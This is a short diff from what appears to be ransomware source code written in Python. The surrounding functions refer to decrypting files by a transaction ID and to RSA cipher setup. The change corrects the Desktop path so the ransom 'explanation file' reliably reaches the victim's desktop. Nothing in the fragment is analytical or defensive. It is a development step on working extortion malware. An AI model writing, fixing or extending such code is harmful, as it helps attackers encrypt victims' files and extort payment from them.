@@ -124,7 +124,8 @@ async def decrypt_files(transaction_id):
 
 async def main():
     # copy explanation file to desktop
-    shutil.copy(EXPLANATION_FILENAME, os.path.join(os.environ["HOMEPATH"], "Desktop"))
+    desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
+    shutil.copy(EXPLANATION_FILENAME, desktop_path)
 
     rsa_cipher.setup()
 
